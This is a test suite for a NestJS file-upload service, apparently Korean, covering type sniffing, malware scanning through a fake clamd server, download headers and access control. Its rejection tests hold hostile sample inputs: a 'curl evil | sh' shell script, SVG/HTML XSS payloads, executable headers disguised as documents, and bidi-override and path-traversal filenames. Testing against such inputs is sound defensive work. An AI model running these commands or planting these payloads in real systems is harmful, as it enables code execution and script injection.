import { INestApplication } from '@nestjs/common';
import { createServer, type AddressInfo, type Server } from 'node:net';
import { resetConfigCache } from '../src/config/configuration';
import { EICAR_TEST_SIGNATURE } from '../src/common/storage/malware-scanner';
import { seed } from '../prisma/seed';
import { createApp, createUser, login, prisma, resetDatabase, TEST_PASSWORD, type Client } from './helpers';

const PNG = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0, 0, 0, 0x0d, 0x49, 0x48, 0x44, 0x52]);
const JPEG = Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0, 0x10, 0x4a, 0x46, 0x49, 0x46]);
const PDF = Buffer.from('%PDF-1.4\n%test\n');
const MALWARE_MARKER = 'OOGAM-FAKE-MALWARE-MARKER';
const MAX_MB = 0.05; // ≈ 51KB

const ENV_KEYS = ['MALWARE_SCAN_MODE', 'MAX_UPLOAD_MB', 'CLAMAV_HOST', 'CLAMAV_PORT', 'CLAMAV_TIMEOUT_MS'] as const;
const savedEnv = Object.fromEntries(ENV_KEYS.map((k) => [k, process.env[k]]));

function setScanMode(mode: 'off' | 'clamav' | 'required', port?: number) {
  process.env.MALWARE_SCAN_MODE = mode;
  process.env.CLAMAV_HOST = '127.0.0.1';
  if (port !== undefined) process.env.CLAMAV_PORT = String(port);
  process.env.CLAMAV_TIMEOUT_MS = '2000';
  resetConfigCache();
}

/** clamd INSTREAM 프로토콜을 흉내 내는 가짜 서버: 마커 문자열이 있으면 FOUND */
function startFakeClamd(): Promise<{ server: Server; port: number; scanned: () => number }> {
  let count = 0;
  const server = createServer((sock) => {
    let buf = Buffer.alloc(0);
    let commandRead = false;
    const data: Buffer[] = [];
    sock.on('data', (d) => {
      buf = Buffer.concat([buf, d]);
      if (!commandRead) {
        const nul = buf.indexOf(0);
        if (nul < 0) return;
        const cmd = buf.subarray(0, nul).toString();
        if (cmd !== 'zINSTREAM') {
          sock.end('UNKNOWN COMMAND\0');
          return;
        }
        commandRead = true;
        buf = buf.subarray(nul + 1);
      }
      while (buf.length >= 4) {
        const len = buf.readUInt32BE(0);
        if (len === 0) {
          count += 1;
          const content = Buffer.concat(data);
          sock.end(content.includes(MALWARE_MARKER) ? 'stream: Oogam.Test.Marker FOUND\0' : 'stream: OK\0');
          buf = Buffer.alloc(0);
          return;
        }
        if (buf.length < 4 + len) return;
        data.push(buf.subarray(4, 4 + len));
        buf = buf.subarray(4 + len);
      }
    });
    sock.on('error', () => undefined);
  });
  return new Promise((resolve) => server.listen(0, '127.0.0.1', () => resolve({ server, port: (server.address() as AddressInfo).port, scanned: () => count })));
}

/** 닫힌(사용하지 않는) 포트 */
async function unusedPort(): Promise<number> {
  const s = createServer();
  await new Promise<void>((r) => s.listen(0, '127.0.0.1', () => r()));
  const port = (s.address() as AddressInfo).port;
  await new Promise<void>((r) => s.close(() => r()));
  return port;
}

describe('File upload security', () => {
  let app: INestApplication;
  let orgId: string;
  let workspaceId: string;
  let alice: Client;
  let aliceId: string;
  let bob: Client;
  let manager: Client;
  let managerId: string;
  let owner: Client;

  const upload = (c: Client, buf: Buffer, name: string, contentType: string, fields: Record<string, string> = {}) => {
    let req = c.agent.post('/api/v1/files').set('X-CSRF-Token', c.csrf);
    for (const [k, v] of Object.entries(fields)) req = req.field(k, v);
    return req.attach('file', buf, { filename: name, contentType });
  };

  beforeAll(async () => {
    ({ organizationId: orgId, workspaceId } = await resetDatabase());
    process.env.MAX_UPLOAD_MB = String(MAX_MB);
    setScanMode('off');
    app = await createApp();
    owner = await login(app, 'owner@test.oogam');
    const a = await createUser(orgId, 'EMPLOYEE', { departmentName: '테크' });
    const b = await createUser(orgId, 'EMPLOYEE', { departmentName: '콘텐츠' });
    const m = await createUser(orgId, 'MANAGER', { departmentName: '테크' });
    aliceId = a.id;
    managerId = m.id;
    alice = await login(app, a.email);
    bob = await login(app, b.email);
    manager = await login(app, m.email);
  });
  afterAll(async () => {
    await app.close();
    await prisma.$disconnect();
    for (const k of ENV_KEYS) {
      if (savedEnv[k] === undefined) delete process.env[k];
      else process.env[k] = savedEnv[k];
    }
    resetConfigCache();
  });

  describe('content sniffing', () => {
    it('rejects content that does not match the declared type/extension (400)', async () => {
      const r1 = await upload(alice, JPEG, 'photo.png', 'image/png');
      expect(r1.status).toBe(400);
      expect(r1.body.message).toContain('일치하지 않습니다');
      expect((await upload(alice, Buffer.from('just text'), 'doc.pdf', 'application/pdf')).status).toBe(400);
      expect((await upload(alice, Buffer.from('PK\x03\x04readme.txt', 'latin1'), 'report.docx', 'application/vnd.openxmlformats-officedocument.wordprocessingml.document')).status).toBe(400);
      expect((await upload(alice, PNG, 'notes.txt', 'text/plain')).status).toBe(400);
    });

    it('stores the detected type and scan status', async () => {
      const res = await upload(alice, Buffer.from('이름,금액\n홍길동,1000\n'), '정산.csv', 'text/csv');
      expect(res.status).toBe(201);
      expect(res.body).toMatchObject({ mimeType: 'text/csv', detectedMime: 'text/csv', scanStatus: 'SKIPPED', downloadable: true });
      const row = await prisma.file.findUniqueOrThrow({ where: { id: res.body.id } });
      expect(row).toMatchObject({ detectedMime: 'text/csv', scanStatus: 'SKIPPED', scanEngine: null });

      const docx = Buffer.from('PK\x03\x04....[Content_Types].xml....word/document.xml', 'latin1');
      const d = await upload(alice, docx, '보고서.docx', 'application/vnd.openxmlformats-officedocument.wordprocessingml.document');
      expect(d.status).toBe(201);
      expect(d.body.detectedMime).toBe('application/vnd.openxmlformats-officedocument.wordprocessingml.document');
    });
  });

  describe('dangerous types', () => {
    it.each([
      ['MZ executable disguised as pdf', Buffer.from('MZ\x90\x00\x03\x00\x00\x00', 'latin1'), 'report.pdf', 'application/pdf'],
      ['.exe', Buffer.from('MZ\x90\x00', 'latin1'), 'setup.exe', 'application/x-msdownload'],
      ['ELF disguised as txt', Buffer.from([0x7f, 0x45, 0x4c, 0x46, 2, 1, 1, 0]), 'data.txt', 'text/plain'],
      ['Mach-O', Buffer.from([0xcf, 0xfa, 0xed, 0xfe, 7, 0, 0, 1]), 'tool.zip', 'application/zip'],
      ['shebang script as txt', Buffer.from('#!/bin/sh\ncurl evil | sh\n'), 'run.txt', 'text/plain'],
      ['SVG', Buffer.from('<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>'), 'logo.svg', 'image/svg+xml'],
      ['SVG disguised as png', Buffer.from('<svg onload="alert(1)"></svg>'), 'logo.png', 'image/png'],
      ['HTML', Buffer.from('<!doctype html><script>alert(1)</script>'), 'page.html', 'text/html'],
      ['HTML disguised as txt', Buffer.from('<html><body><script>alert(1)</script></body></html>'), 'readme.txt', 'text/plain'],
      ['double extension .pdf.exe', PDF, 'invoice.pdf.exe', 'application/pdf'],
      ['double extension .exe.pdf', PDF, 'invoice.exe.pdf', 'application/pdf'],
      ['hidden .html.txt', Buffer.from('hello'), 'page.html.txt', 'text/plain'],
    ])('rejects %s (415)', async (_label, buf, name, type) => {
      const res = await upload(alice, buf, name, type);
      expect(res.status).toBe(415);
      expect(typeof res.body.message).toBe('string');
    });

    it('rejects names with control / bidi-override characters (400) and sanitizes stored names', async () => {
      const rlo = await upload(alice, Buffer.from('hello'), 'report‮txt.exe.txt', 'text/plain');
      expect(rlo.status).toBe(400);
      expect(rlo.body.message).toContain('파일 이름');

      const long = `${'가'.repeat(250)}.txt`;
      const res = await upload(alice, Buffer.from('hello'), `..\\..\\${long}`, 'text/plain');
      expect(res.status).toBe(201);
      expect(res.body.originalName.length).toBeLessThanOrEqual(200);
      expect(res.body.originalName).toMatch(/^가+\.txt$/);
      // NFD 한글 → NFC 로 저장
      const nfd = '한글.txt'.normalize('NFD');
      const n = await upload(alice, Buffer.from('hello'), nfd, 'text/plain');
      expect(n.status).toBe(201);
      expect(n.body.originalName).toBe('한글.txt'.normalize('NFC'));
    });
  });

  describe('size', () => {
    it('rejects empty files (400)', async () => {
      const res = await upload(alice, Buffer.alloc(0), 'empty.txt', 'text/plain');
      expect(res.status).toBe(400);
      expect(res.body.message).toContain('빈 파일');
    });

    it('rejects files larger than MAX_UPLOAD_MB (413)', async () => {
      const big = Buffer.alloc(Math.ceil(MAX_MB * 1024 * 1024) + 10, 0x61);
      const res = await upload(alice, big, 'big.txt', 'text/plain');
      expect(res.status).toBe(413);
      expect(res.body.message).toContain('허용 한도');
      const ok = await upload(alice, Buffer.alloc(1024, 0x61), 'small.txt', 'text/plain');
      expect(ok.status).toBe(201);
    });
  });

  describe('malware scanning', () => {
    let clamd: Awaited<ReturnType<typeof startFakeClamd>>;
    beforeAll(async () => {
      clamd = await startFakeClamd();
    });
    afterAll(async () => {
      setScanMode('off');
      await new Promise<void>((r) => clamd.server.close(() => r()));
    });

    it("rejects the EICAR test file even in 'off' mode (422 + audit) and never stores it", async () => {
      setScanMode('off');
      const before = await prisma.file.count();
      const res = await upload(alice, Buffer.from(EICAR_TEST_SIGNATURE), 'eicar.txt', 'text/plain');
      expect(res.status).toBe(422);
      expect(await prisma.file.count()).toBe(before);
      const log = await prisma.auditLog.findFirst({ where: { action: 'file.malware_detected', actorId: aliceId } });
      expect(log?.metadata).toMatchObject({ engine: 'builtin-eicar', name: 'eicar.txt' });
    });

    it("'clamav' mode: clean → CLEAN, infected → 422 + audit, nothing stored", async () => {
      setScanMode('clamav', clamd.port);
      const clean = await upload(alice, Buffer.from('평범한 메모'), 'clean.txt', 'text/plain');
      expect(clean.status).toBe(201);
      expect(clean.body.scanStatus).toBe('CLEAN');
      const row = await prisma.file.findUniqueOrThrow({ where: { id: clean.body.id } });
      expect(row).toMatchObject({ scanStatus: 'CLEAN', scanEngine: 'clamav' });
      expect(row.scannedAt).toBeInstanceOf(Date);
      expect((await alice.get(`/files/${clean.body.id}/download`)).status).toBe(200);

      const scannedBefore = clamd.scanned();
      const infected = await upload(alice, Buffer.from(`hello ${MALWARE_MARKER} world`), 'bad.txt', 'text/plain');
      expect(infected.status).toBe(422);
      expect(infected.body.message).toContain('악성코드');
      expect(clamd.scanned()).toBe(scannedBefore + 1);
      expect(await prisma.file.count({ where: { originalName: 'bad.txt' } })).toBe(0);
      const log = await prisma.auditLog.findFirst({ where: { action: 'file.malware_detected', metadata: { path: ['signature'], equals: 'Oogam.Test.Marker' } } });
      expect(log).not.toBeNull();
    });

    it("'clamav' mode: engine unreachable → stored as ERROR, download locked (423) until rescanned", async () => {
      setScanMode('clamav', await unusedPort());
      const res = await upload(alice, Buffer.from('engine down'), 'pending.txt', 'text/plain');
      expect(res.status).toBe(201);
      expect(res.body).toMatchObject({ scanStatus: 'ERROR', downloadable: false });
      const dl = await alice.get(`/files/${res.body.id}/download`);
      expect(dl.status).toBe(423);
      expect(dl.body.message).toContain('악성코드 검사');

      // 엔진이 여전히 다운 → 재검사 503
      expect((await alice.post(`/files/${res.body.id}/rescan`)).status).toBe(503);
      // 다른 사용자는 파일 자체를 볼 수 없음
      expect((await bob.post(`/files/${res.body.id}/rescan`)).status).toBe(404);
      // 엔진 복구 후 재검사 → CLEAN → 다운로드 가능
      setScanMode('clamav', clamd.port);
      const rescan = await alice.post(`/files/${res.body.id}/rescan`);
      expect(rescan.status).toBe(201);
      expect(rescan.body.scanStatus).toBe('CLEAN');
      const ok = await alice.get(`/files/${res.body.id}/download`);
      expect(ok.status).toBe(200);
      expect(ok.text).toBe('engine down');
    });

    it("'required' mode: engine unreachable → upload rejected (503, fail-closed)", async () => {
      setScanMode('required', await unusedPort());
      const before = await prisma.file.count();
      const res = await upload(alice, Buffer.from('hello'), 'x.txt', 'text/plain');
      expect(res.status).toBe(503);
      expect(await prisma.file.count()).toBe(before);
      setScanMode('required', clamd.port);
      const ok = await upload(alice, Buffer.from('hello'), 'x.txt', 'text/plain');
      expect(ok.status).toBe(201);
      expect(ok.body.scanStatus).toBe('CLEAN');
      setScanMode('off');
    });
  });

  describe('download headers', () => {
    it('serves text as attachment with sandbox CSP, nosniff and no-store using the detected type', async () => {
      const up = await upload(alice, Buffer.from('<b>not html</b> plain'), 'memo.txt', 'text/plain');
      expect(up.status).toBe(201);
      const dl = await alice.get(`/files/${up.body.id}/download`);
      expect(dl.status).toBe(200);
      expect(dl.headers['content-security-policy']).toContain('sandbox');
      expect(dl.headers['content-security-policy']).toContain("default-src 'none'");
      expect(dl.headers['x-content-type-options']).toBe('nosniff');
      expect(dl.headers['cache-control']).toBe('private, no-store');
      expect(dl.headers['content-disposition']).toMatch(/^attachment;/);
      expect(dl.headers['content-type']).toMatch(/^text\/plain/);
    });

    it('serves images/pdf inline and zip containers as attachment', async () => {
      const png = await upload(alice, PNG, 'shot.png', 'image/png');
      const dl = await alice.get(`/files/${png.body.id}/download`);
      expect(dl.headers['content-type']).toBe('image/png');
      expect(dl.headers['content-disposition']).toMatch(/^inline;/);
      expect(dl.headers['content-security-policy']).toContain('sandbox');

      const zip = await upload(alice, Buffer.from('PK\x03\x04[Content_Types].xml word/x', 'latin1'), 'bundle.zip', 'application/zip');
      expect(zip.status).toBe(201);
      const z = await alice.get(`/files/${zip.body.id}/download`);
      expect(z.headers['content-type']).toBe('application/zip');
      expect(z.headers['content-disposition']).toMatch(/^attachment;/);
    });
  });

  describe('access control', () => {
    let projectFileId: string;
    let projectId: string;
    let pageId: string;

    beforeAll(async () => {
      const tech = await prisma.department.findFirstOrThrow({ where: { organizationId: orgId, name: '테크' } });
      const project = await prisma.project.create({
        data: { organizationId: orgId, key: 'SEC', name: '보안 프로젝트', createdById: managerId, managerId, departmentId: tech.id, members: { create: [{ userId: managerId, role: 'MANAGER' }] } },
      });
      projectId = project.id;
      const res = await upload(manager, PDF, '설계.pdf', 'application/pdf', { targetType: 'PROJECT', targetId: projectId });
      expect(res.status).toBe(201);
      projectFileId = res.body.id;
      const page = await prisma.page.create({ data: { organizationId: orgId, workspaceId, title: '비공개', visibility: 'PRIVATE', createdById: aliceId } });
      pageId = page.id;
    });

    it('listing by target requires view access to the target', async () => {
      expect((await alice.get(`/files?targetType=PROJECT&targetId=${projectId}`)).status).toBe(200);
      expect((await bob.get(`/files?targetType=PROJECT&targetId=${projectId}`)).status).toBe(404);
      expect((await bob.get(`/files?targetType=PAGE&targetId=${pageId}`)).status).toBe(404);
    });

    it('delete requires uploader or edit access on the target', async () => {
      // alice 는 열람만 가능(같은 부서) → 삭제 불가
      expect((await alice.get(`/files/${projectFileId}/download`)).status).toBe(200);
      expect((await alice.del(`/files/${projectFileId}`)).status).toBe(403);
      expect((await bob.del(`/files/${projectFileId}`)).status).toBe(404);
      expect((await manager.del(`/files/${projectFileId}`)).status).toBe(200);
    });

    it('GUEST cannot upload', async () => {
      const guest = await login(app, (await createUser(orgId, 'GUEST')).email);
      expect((await upload(guest, Buffer.from('x'), 'x.txt', 'text/plain')).status).toBe(403);
    });

    it('isolates organizations', async () => {
      const mine = await upload(alice, Buffer.from('org A secret'), 'secret.txt', 'text/plain');
      expect(mine.status).toBe(201);

      const prev = { slug: process.env.SEED_ORG_SLUG, email: process.env.SEED_OWNER_EMAIL };
      process.env.SEED_ORG_SLUG = 'other-org';
      process.env.SEED_OWNER_EMAIL = 'owner@other.test';
      process.env.SEED_OWNER_PASSWORD = TEST_PASSWORD;
      try {
        await seed(prisma, { quiet: true });
      } finally {
        if (prev.slug === undefined) delete process.env.SEED_ORG_SLUG;
        else process.env.SEED_ORG_SLUG = prev.slug;
        process.env.SEED_OWNER_EMAIL = prev.email;
      }
      const other = await login(app, 'owner@other.test');
      expect((await other.get(`/files/${mine.body.id}`)).status).toBe(404);
      expect((await other.get(`/files/${mine.body.id}/download`)).status).toBe(404);
      expect((await other.del(`/files/${mine.body.id}`)).status).toBe(404);
      expect((await other.post(`/files/${mine.body.id}/rescan`)).status).toBe(404);
      expect((await other.get(`/files?targetType=PAGE&targetId=${pageId}`)).status).toBe(404);
      expect((await upload(other, Buffer.from('x'), 'x.txt', 'text/plain', { targetType: 'PAGE', targetId: pageId })).status).toBe(403);
      expect((await other.get('/files')).body.items).toHaveLength(0);
      // 원래 조직 OWNER 도 다른 사용자의 미첨부 파일은 볼 수 없음
      expect((await owner.get(`/files/${mine.body.id}/download`)).status).toBe(404);
    });
  });
});
